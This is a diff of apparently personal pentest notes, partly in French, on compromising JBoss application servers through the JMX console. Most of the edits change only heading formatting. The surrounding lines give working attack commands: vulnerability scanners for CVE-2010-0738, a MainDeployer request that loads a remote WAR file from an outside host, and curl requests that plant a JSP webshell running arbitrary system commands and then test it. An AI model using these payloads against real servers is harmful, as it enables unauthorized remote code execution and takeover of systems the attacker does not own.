@@ -48,7 +48,7 @@ mbeanServer.invoke(new ObjectName("jboss.web:type=Manager,host=localhost"), "lis
 # scanner des jmx-console
 http://FILE0:8080/jmx-console/style_master.css
 
-## info gathering
+# info gathering
 clusterd
 msf auxiliary/scanner/http/jboss_vulnscan
 nmap http-vuln-cve2010-0738.nse
@@ -61,7 +61,7 @@ nmap http-vuln-cve2010-0738.nse
 
 verb tampering
 
-## webshell
+# webshell via jmx-console
 * MainDeployer
 http://127.0.0.1:8080/jmx-console/HtmlAdaptor?action=invokeOp&name=jboss.system%253Aservice%253DMainDeployer&methodIndex=17&arg0=http%3A%2F%2F6.6.6.6%2Fpub%2FWSTest.war
 
@@ -70,7 +70,7 @@ curl -v http://127.0.0.1:8080/jmx-console/HtmlAdaptor -d 'action=invokeOpByName&
 curl -v http://127.0.0.1:8080/wstestdepl/wstestdepl.jsp
 curl -v http://127.0.0.1:8080/wstest/
 
-# webshell le plus simple possible mais on verra pas le resultat des commandes (exemple du paper 2010 redteam)
+* webshell le plus simple possible mais on verra pas le resultat des commandes (exemple du paper 2010 redteam)
 curl -X HEAD -v 'http://127.0.0.1:8080/jmx-console/HtmlAdaptor?action=invokeOpByName&name=jboss.admin%3Aservice%3DDeploymentFileRepository&methodName=store&argType=java.lang.String&arg0=shell.war&argType=java.lang.String&arg1=shell&argType=java.lang.String&arg2=.jsp&argType=java.lang.String&arg3=%3C%25Runtime.getRuntime%28%29.exec%28request.getParameter%28%22c%22%29%29%3B%25%3E%0A&argType=boolean&arg4=True'
 curl -v 'http://127.0.0.1:8080/shell/shell.jsp?c=touch%20%2ftmp%2fowned.txt'
 
